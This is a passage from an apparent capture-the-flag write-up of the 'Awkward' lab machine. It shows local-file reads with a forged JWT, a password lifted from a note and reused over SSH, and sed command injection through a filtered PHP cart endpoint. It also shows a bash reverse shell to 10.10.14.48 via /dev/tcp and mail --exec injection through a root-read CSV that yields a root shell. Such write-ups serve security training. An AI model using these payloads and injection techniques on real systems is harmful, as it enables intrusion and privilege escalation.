# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
```

How about bean's `.bashrc` file located at `/home/bean/.bashrc`:

```bash
$./lfi.sh /home/bean/.bashrc
Sending JWT with curl request: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzU0OTU3NjMsInVzZXJuYW1lIjoiLycgL2hvbWUvYmVhbi8uYmFzaHJjICcvIn0.WWGbwmemekjTYLr8C6A00xCmO45oz7oNLvKO_BriKd0
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

The alias `backup_home='/bin/bash /home/bean/Documents/backup_home.sh'` looks interesting... Let's read it!:

```bash
$./lfi.sh /home/bean/Documents/backup_home.sh
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Let's get this file and gunzip it (note, I added `--output -` to my lfi.sh script above to capture raw binary):

```bash
$./lfi.sh /home/bean/Documents/backup/bean_backup_final.tar.gz > bean_backup_final.tar.gz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 31716  100 31716    0     0   339k      0 --:--:-- --:--:-- --:--:--  344k

$tar xzvf bean_backup_final.tar.gz 

gzip: stdin: unexpected end of file
./
./bean_backup.tar.gz
./time.txt
tar: Child returned status 1
tar: Error is not recoverable: exiting now

$tar xzvf bean_backup.tar.gz 
./
./Templates/
./.ssh/
./Pictures/
./.config/
./.config/xpad/
./.config/xpad/info-GQ1ZS1
./.config/xpad/default-style
./.config/xpad/content-DS1ZS1
./.config/gnome-initial-setup-done
./.config/goa-1.0/
./.config/update-notifier/
./.config/dconf/
./.config/dconf/user
./.config/autostart/
./.config/autostart/xpad.desktop
./.config/.gsd-keyboard.settings-ported
./.config/ibus/
./.config/ibus/bus/
./.config/ibus/bus/ee6a821b27764b4d9e547b4690827539-unix-wayland-0
./.config/ibus/bus/ee6a821b27764b4d9e547b4690827539-unix-0
./.config/gtk-3.0/
./.config/gtk-3.0/bookmarks
./.config/pulse/
./.config/pulse/cookie
./.config/pulse/ee6a821b27764b4d9e547b4690827539-default-source
./.config/pulse/ee6a821b27764b4d9e547b4690827539-stream-volumes.tdb
./.config/pulse/ee6a821b27764b4d9e547b4690827539-card-database.tdb
./.config/pulse/ee6a821b27764b4d9e547b4690827539-device-volumes.tdb
./.config/pulse/ee6a821b27764b4d9e547b4690827539-default-sink
./.config/nautilus/
./.config/evolution/
./.config/evolution/sources/
./.config/evolution/sources/system-proxy.source
./.config/user-dirs.dirs
./.config/user-dirs.locale
./Videos/
./.gnupg/
./.gnupg/pubring.kbx
./.gnupg/trustdb.gpg
./.local/
./.local/share/
./.local/share/keyrings/
./.local/share/keyrings/login.keyring
./.local/share/keyrings/user.keystore
./.local/share/icc/
./.local/share/applications/
./.local/share/gnome-settings-daemon/
./.local/share/gnome-settings-daemon/input-sources-converted
./.local/share/gnome-shell/
./.local/share/gnome-shell/application_state
./.local/share/gnome-shell/gnome-overrides-migrated
./.local/share/recently-used.xbel
./.local/share/nautilus/
./.local/share/nautilus/tracker2-migration-complete
./.local/share/nautilus/tags/
./.local/share/nautilus/tags/meta.db-shm
./.local/share/nautilus/tags/meta.db-wal
./.local/share/nautilus/tags/.meta.isrunning
./.local/share/nautilus/tags/meta.db
./.local/share/nautilus/tags/ontologies.gvdb
./.local/share/evolution/
./.local/share/evolution/memos/
./.local/share/evolution/memos/trash/
./.local/share/evolution/addressbook/
./.local/share/evolution/addressbook/system/
./.local/share/evolution/addressbook/system/contacts.db
./.local/share/evolution/addressbook/system/photos/
./.local/share/evolution/addressbook/trash/
./.local/share/evolution/tasks/
./.local/share/evolution/tasks/system/
./.local/share/evolution/tasks/system/tasks.ics
./.local/share/evolution/tasks/trash/
./.local/share/evolution/calendar/
./.local/share/evolution/calendar/system/
./.local/share/evolution/calendar/trash/
./.local/share/evolution/mail/
./.local/share/evolution/mail/trash/
./.local/share/sounds/
./.local/share/flatpak/
./.local/share/flatpak/db/
./.local/share/ibus-table/
./.local/share/gvfs-metadata/
./.local/share/gvfs-metadata/home
./.local/share/gvfs-metadata/home-41546c5f.log
./.local/share/gvfs-metadata/root-46f3d4c6.log
./.local/share/gvfs-metadata/root
./.local/share/nano/
./.local/share/session_migration-ubuntu
./Music/
./snap/
./snap/snapd-desktop-integration/
./snap/snapd-desktop-integration/current
./snap/snapd-desktop-integration/14/
./snap/snapd-desktop-integration/14/Templates/
./snap/snapd-desktop-integration/14/.themes
./snap/snapd-desktop-integration/14/Pictures/
./snap/snapd-desktop-integration/14/.config/
./snap/snapd-desktop-integration/14/.config/dconf/
./snap/snapd-desktop-integration/14/.config/dconf/user
./snap/snapd-desktop-integration/14/.config/fontconfig/
./snap/snapd-desktop-integration/14/.config/fontconfig/fonts.conf
./snap/snapd-desktop-integration/14/.config/user-dirs.locale.md5sum
./snap/snapd-desktop-integration/14/.config/ibus/
./snap/snapd-desktop-integration/14/.config/ibus/bus
./snap/snapd-desktop-integration/14/.config/gtk-2.0/
./snap/snapd-desktop-integration/14/.config/gtk-2.0/gtkfilechooser.ini
./snap/snapd-desktop-integration/14/.config/gtk-3.0/
./snap/snapd-desktop-integration/14/.config/gtk-3.0/settings.ini
./snap/snapd-desktop-integration/14/.config/gtk-3.0/bookmarks
./snap/snapd-desktop-integration/14/.config/user-dirs.dirs.md5sum
./snap/snapd-desktop-integration/14/.config/user-dirs.dirs
./snap/snapd-desktop-integration/14/.config/user-dirs.locale
./snap/snapd-desktop-integration/14/Videos/
./snap/snapd-desktop-integration/14/.last_revision
./snap/snapd-desktop-integration/14/.local/
./snap/snapd-desktop-integration/14/.local/share/
./snap/snapd-desktop-integration/14/.local/share/themes
./snap/snapd-desktop-integration/14/.local/share/icons/
./snap/snapd-desktop-integration/14/.local/share/glib-2.0/
./snap/snapd-desktop-integration/14/.local/share/glib-2.0/schemas/
./snap/snapd-desktop-integration/14/Music/
./snap/snapd-desktop-integration/14/Downloads/
./snap/snapd-desktop-integration/14/Desktop/
./snap/snapd-desktop-integration/14/Public/
./snap/snapd-desktop-integration/14/Documents/
./snap/snapd-desktop-integration/common/
./.bashrc
./Downloads/
./.bash_history
./.profile
./Desktop/
./Public/
./.bash_logout
./Documents/
./Documents/backup_tmp/
./Documents/backup_tmp/bean_backup.tar.gz
./Documents/backup_home.sh
./Documents/backup/

```

The gnome keyring files above look interesting -- and according to [Linux Privilege Escalation – Credentials Harvesting - StefLan&#039;s Security Blog](https://steflan-security.com/linux-privilege-escalation-credentials-harvesting/), we can extract hashes out for john the ripper to brute force:

```bash
[zara@supernova]─[~/hat-valley/download/.local/share/keyrings]
└──╼ $ls -la
total 8
drwx------ 1 zara zara  52 Sep 15 21:35 .
drwx------ 1 zara zara 308 Sep 15 21:43 ..
-rw------- 1 zara zara 105 Sep 15 21:35 login.keyring
-rw------- 1 zara zara 207 Sep 15 21:35 user.keystore

$python2 /usr/share/john/keyring2john.py login.keyring > ~/hat-valley/keyring_hash.txt

$john --wordlist=/usr/share/wordlists/rockyou.txt ~/hat-valley/keyring_hash.txt
```

I let john the ripper run using `rockyou.txt` as my wordlist, and I tried some wordlists from [SecLists](https://github.com/danielmiessler/SecLists), but wasn't able to brute force the hash.

If we grep all files for the username `bean` (ignoring our lfi.sh script):

```bash
$grep -irn bean
lfi.sh:8:JWT=$(jwt encode --secret 123beany123 "$JSON_PAYLOAD")
.config/xpad/content-DS1ZS1:9:bean.hill
.config/xpad/content-DS1ZS1:10:014mrbeanrules!#P

```

This looks like a set of credentials in an xpad note.. maybe?  Let's try it as an SSH password:

```bash
 $ssh bean@hat-valley.htb
bean@hat-valley.htb's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Sat Feb  4 08:13:10 2023 from 10.10.14.77
bean@awkward:~$ 
 bean@awkward:~$ cat user.txt 
5662762c28a1c7b3cc16035d5bfd82ee

```

 Yep! So we have user / password combination bean / 014mrbeanrules!#P , and we get the user flag!

## Privilege Escalation

Looking at the output of `ps auxfe`,  the main thing that stands out is nginx running as root, with two worker processes running as www-data:

```bash
root        1370  0.0  0.0  55196  1764 ?        Ss   Feb03   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1372  0.1  0.1  56468  7120 ?        S    Feb03   2:04  \_ nginx: worker process
www-data    1373  0.0  0.1  56344  6720 ?        S    Feb03   1:05  \_ nginx: worker process

```

As user bean, I cannot run anything as sudo.  I found the following user/hash for HTTP basic auth in nginx.  Initial attempts to brute force failed here:

```bash
bean@awkward:/etc/nginx/conf.d$ cat .htpasswd 
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

Browsing to http://store.hat-valley.htb/, I tried admin / 014mrbeanrules!#P - which works:

![](./assets/2023-02-04-19-50-18-image.png)

It's here I started looking for dynamic behaviour.  And while we can't check out, we can add items to cart, and then remove them once in the cart:

![](./assets/2023-02-04-20-01-14-image.png)

Adding item to cart:

```
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://store.hat-valley.htb/shop.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 46
Origin: http://store.hat-valley.htb
DNT: 1
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close

item=1&user=59ab-bdec-f4c-c29c&action=add_item
```

We also have access to the server PHP in `/var/www/store` and can see cart_actions.php to ascertain the behaviour and find any vulnerabilities:

```bash
bean@awkward:/var/www/store$ cat cart_actions.php 
<?php

$STORE_HOME = "/var/www/store/";

//check for valid hat valley store item
function checkValidItem($filename) {
    if(file_exists($filename)) {
        $first_line = file($filename)[0];
        if(strpos($first_line, "***Hat Valley") !== FALSE) {
            return true;
        }
    }
    return false;
}

//add to cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//fetch from cart
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_GET['action'] === 'fetch_items' && $_GET['user']) {
    $html = "";
    $dir = scandir("{$STORE_HOME}cart");
    $files = array_slice($dir, 2);

    foreach($files as $file) {
        $user_id = substr($file, -18);
        if($user_id === $_GET['user'] && checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
            $product_file = fopen("{$STORE_HOME}cart/{$file}", "r");
            $details = array();
            while (($line = fgets($product_file)) !== false) {
                if(str_replace(array("\r", "\n"), '', $line) !== "***Hat Valley Cart***") { //don't include first line
                    array_push($details, str_replace(array("\r", "\n"), '', $line));
                }
            }
            foreach($details as $cart_item) {
                 $cart_items = explode("&", $cart_item);
                 for($x = 0; $x < count($cart_items); $x++) {
                      $cart_items[$x] = explode("=", $cart_items[$x]); //key and value as separate values in subarray
                 }
                 $html .= "<tr><td>{$cart_items[1][1]}</td><td>{$cart_items[2][1]}</td><td>{$cart_items[3][1]}</td><td><button data-id={$cart_items[0][1]} onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'>Remove</button></td></tr>";
            }
        }
    }
    echo $html;
    exit;
}

?>
```

When attempting to add to cart, it will check to ensure a file with matching item id exists in `/var/www/store/product-details`, and the file contains string `*** Hat Valley`.

Then, it will shell out via `system()` php function and output `*** Hat valley Cart***` to `/var/www/store/user_id`.

Finally, the script will add the first two lines from the product file to this user cart file:

```php
    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
p
```

Our available product files:

```bash
bean@awkward:/var/www/store$ tail -v product-details/*
==> poduct-details/1.txt <==
***Hat Valley Product***
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90

==> product-details/2.txt <==
***Hat Valley Product***
item_id=2&item_name=Palm Tree Cap&item_brand=Kool Kats&item_price=$48.50

==> product-details/3.txt <==
***Hat Valley Product***
item_id=3&item_name=Straw Hat&item_brand=Sunny Summer&item_price=$70.00

```

We can inject the user_id, avoiding the filter of bad characters that tries to stop us doing command injection:

```
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://store.hat-valley.htb/shop.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 49
Origin: http://store.hat-valley.htb
DNT: 1
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close

item=1&user=my_cool_injected_user&action=add_item
```

```bash
bean@awkward:/var/www/store$ ls -la cart/
total 12
drwxrwxrwx 2 root     root     4096 Feb  4 20:24 .
drwxr-xr-x 9 root     root     4096 Oct  6 01:35 ..
-rw-r--r-- 1 www-data www-data   96 Feb  4 20:24 my_cool_injected_user

```

This didn't really lead anywhere, but next, if we run pspy (process spy), add and remove items from cart as normal & expected user behaviour, we see:

```
2023/02/04 20:49:22 CMD: UID=33   PID=47950  | tail -1 
2023/02/04 20:49:22 CMD: UID=33   PID=47949  | head -2 /var/www/store/product-details/1.txt 
2023/02/04 20:49:22 CMD: UID=33   PID=47948  | sh -c head -2 /var/www/store/product-details/1.txt | tail -1 >> /var/www/store/cart/59ab-bdec-f4c-c29c 
2023/02/04 20:49:41 CMD: UID=33   PID=47951  | sh -c sed -i '/item_id=1/d' /var/www/store/cart/59ab-bdec-f4c-c29c 


```

So the item (id = 1) is added to user cart, then `sed` is used to remove it from the cart.  At this point, I went straight to [GTFOBins](https://gtfobins.github.io/gtfobins/sed/), to look at `sed` command injection.  I initially tried the `-n` argument, but this didn't seem to work.  Checking the `sed` man page, the `-e` argument allows us to specify a script expression to execute.

We write a reverse shell into `/dev/shm/test.sh`:

```bash
bean@awkward:/dev/shm$ cat test.sh 
#!/usr/bin/bash
bash -i >& /dev/tcp/10.10.14.48/3322 0>&1
```

We command inject `-e "1e /dev/shm/test.sh"` into the item_id, firstly ensuring that the cart file exists for our user id (by adding something so it exists in `/var/www/store/cart`).  Note the `/dev/shm/test2.txt` file that sed will run against, so it doesn't bomb out. I ensured this file existed first:

```
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://store.hat-valley.htb/cart.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 99
Origin: http://store.hat-valley.htb
DNT: 1
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close 
item=1/d' -e "1e /dev/shm/test.sh" /dev/shm/test2.txt '/&user=59ab-bdec-f4c-c29c&action=delete_item
```

Process spy shows our command injection worked, and we have a shell!:

```
2023/02/05 08:18:05 CMD: UID=33   PID=52825  | sh -c sed -i '/item_id=1/d' -e "1e /dev/shm/test.sh" /dev/shm/test2.txt '//d' /var/www/store/cart/59ab-bdec-f4c-c29c 
2023/02/05 08:18:05 CMD: UID=33   PID=52827  | sh -c /dev/shm/test.sh 
2023/02/05 08:18:05 CMD: UID=33   PID=52826  | sed -i /item_id=1/d -e 1e /dev/shm/test.sh /dev/shm/test2.txt //d /var/www/store/cart/59ab-bdec-f4c-c29c 
2023/02/05 08:18:05 CMD: UID=33   PID=52828  | /usr/bin/bash /dev/shm/test.sh 
2023/02/05 08:18:05 CMD: UID=33   PID=52829  | /usr/bin/bash /dev/shm/test.sh 
```

Let's get a full, proper interactive shell using python:

```bash
$nc -lvnp 3322
listening on [any] 3322 ...
connect to [10.10.14.48] from (UNKNOWN) [10.10.11.185] 41522
bash: cannot set terminal process group (1334): Inappropriate ioctl for device
bash: no job control in this shell
www-data@awkward:~/store$
www-data@awkward:~/store$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@awkward:~/store$ ^Z
www-data@awkward:~/store$ 

```

While running process spy to check my command injection, I also noticed a root (UID=0) cron job running:

```
2023/02/05 18:40:01 CMD: UID=0    PID=57039  | mail -s Leave Request: bean.hill christine 
2023/02/05 18:40:01 CMD: UID=0    PID=57041  | /usr/sbin/sendmail -oi -f root@awkward -t 
2023/02/05 18:40:01 CMD: UID=0    PID=57042  | /usr/sbin/postdrop -r 
2023/02/05 18:40:01 CMD: UID=0    PID=57043  | cleanup -z -t unix -u -c 
2023/02/05 18:40:01 CMD: UID=0    PID=57049  | mail -s Leave Request: bean.hill christine 
2023/02/05 18:40:01 CMD: UID=0    PID=57050  | trivial-rewrite -n rewrite -t unix -u -c 
2023/02/05 18:40:01 CMD: UID=0    PID=57051  | /usr/sbin/sendmail -oi -f root@awkward -t 
2023/02/05 18:40:01 CMD: UID=0    PID=57053  | /usr/sbin/postdrop -r 

```

If we look at the leave requests file, which the cron job reads -- and the same CSV we were retrieving by API earlier -- we, as part of the www-data group, have write access to it!:

```bash
www-data@awkward:~/store$ ls -la /var/www/private
total 12
dr-xr-x--- 2 christine www-data 4096 Oct  6 01:35 .
drwxr-xr-x 7 root      root     4096 Oct  6 01:35 ..
-rwxrwxrwx 1 christine www-data  600 Feb  5 08:30 leave_requests.csv
www-data@awkward:~/store$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The above output from pspy suggests a cron job that sends an email for leave requests for bean and christine, based on the subject passed to `mail`.  Searching the file system for the subject `Leave Request` we find the systemd service:

```bash
ww-data@awkward:/$ grep -irn 'Leave Request' * 2> /dev/null
etc/systemd/system/notify.service:2:Description=Notifies Christine when a new leave request is submitted

www-data@awkward:/$ cat /etc/systemd/system/notify.service 
[Unit]
Description=Notifies Christine when a new leave request is submitted

[Service]
User=root
WorkingDirectory=/root/scripts
ExecStart=/bin/bash -c /root/scripts/notify.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

If I echo a new leave request into the CSV with ` echo "foo,my break, 02/02/2023,03/03/2023,Yes" >> leave_requests.csv`, we get:

```bash
2023/02/05 18:56:04 CMD: UID=0    PID=57141  | mail -s Leave Request: foo christine 
```

We cannot read the script `/root/scripts/notify.sh` -- but given we can write to `leave_requests.csv` directly, and no longer need to worry about filtering, I'm assuming we need to command inject into the subject of the mail command to execute arbitrary code.. 

Looking at https://gtfobins.github.io/gtfobins/mail/ , the `--exec` flag will allow us to execute arbitrary code from within the `mail` command, which in my case will be another reverse shell.

Here's where I spammed different variations of trying to escape from the subject string (`mail -s "<inject here>"`) and run `/dev/shm/test2.sh` - launching my reverse shell on port 3333:

```bash
www-data@awkward:~/private$ echo "\" --exec='\!/dev/shm/test2.sh'" >> leave_requests.csv
www-data@awkward:~/private$ echo "\" --exec=\"\!/dev/shm/test2.sh\"" >> leave_requests.csv
```

Looking back at the netcat listener on my own machine, the second one worked:

```bash
$nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.14.48] from (UNKNOWN) [10.10.11.185] 33704
bash: cannot set terminal process group (874): Inappropriate ioctl for device
bash: no job control in this shell
root@awkward:~/scripts# ls -la
total 24
drwxr-xr-x 2 root root 4096 Oct  6 01:35 .
drwx------ 9 root root 4096 Oct 20 23:02 ..
-rwxr-xr-x 1 root root  145 Oct  5 22:02 express.sh
-rwxr-xr-x 1 root root  318 Sep 15 21:49 notify.sh
-rwxr-xr-x 1 root root  414 Oct  3 21:19 restore.sh
-rwxr-xr-x 1 root root   82 Oct  5 22:45 vue.sh
root@awkward:~/scripts# 
root@awkward:~/scripts# cd /root
cd /root
root@awkward:~# ls     	
ls
backup
root.txt
scripts
snap
root@awkward:~# cat root.txt
cat root.txt
b56c5ced67d9d8941f016654a3e27364

```

And we have the root flag finally!

## Conclusion

This one was quite time consuming and frustrating.  I stumbled on the `awk` LFI and `sed` command injection.  I have to remind myself when doing any kind of injection to always be mindful of the string I'm passing, and if possible, aim for it to be syntactically valid once injected -- otherwise the shelled out command may fail and we miss out on LFI or command injection.

It's easy to see something, get caught up in the excitement of it all and throw variations at it without carefully crafting a payload and considering whether or not commands are likely to error before we get what we need.

Brute forcing a weak JWT signing key was new to me, and the SSRF for the url param initially seemed obvious, but I was blocked for a little while before deciding to try fuzzing ports.   Once again, I needed to remind myself to not just blindly enumerate and fuzz, but look at the broader context and story -- which in this case, involved reminding myself that this was a development server running webpack dev server, and likely not deployed on production-like ports (80, 8080, etc).

I also spent way too much time trying to decompile the webpack bundle VueJS site (not shown in my notes above), hoping to get cleaner JavaScript for the purposes of finding available routes.  After trying a few tools unsuccessfully, in the end I just parsed the file manually (not fun).

Overall a fun machine though, even if it involved a couple of days on and off with regular breaks to step away from the frustration of hitting a brick wall multiple times.

